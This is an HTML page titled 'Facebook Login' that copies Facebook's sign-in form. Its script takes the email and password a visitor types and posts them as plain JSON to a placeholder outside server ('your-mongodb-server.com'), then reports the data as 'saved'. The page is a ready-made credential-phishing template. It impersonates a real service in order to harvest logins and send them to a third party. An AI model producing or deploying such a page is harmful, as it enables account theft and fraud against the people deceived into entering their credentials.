<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <form class="login-form">
            <h2>Login to Facebook</h2>
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="button" onclick="submitForm()">Login</button>
            <div class="forgot-password">Forgot password?</div>
            <hr>
            <div class="create-account">Don't have an account? <a href="#">Sign up</a></div>
        </form>
    </div>

    <script>
        function submitForm() {
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            // Construct the data to be sent to MongoDB
            var userData = { email: email, password: password };

            // Send a POST request to your MongoDB server
            fetch('http://your-mongodb-server.com:27017/your-database/your-collection', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(userData),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                alert('User data saved successfully!');
            })
            .catch(error => {
                console.error('There was an error!', error);
                alert('Error saving user data. Please try again.');
            });
        }
    </script>
</body>
</html>
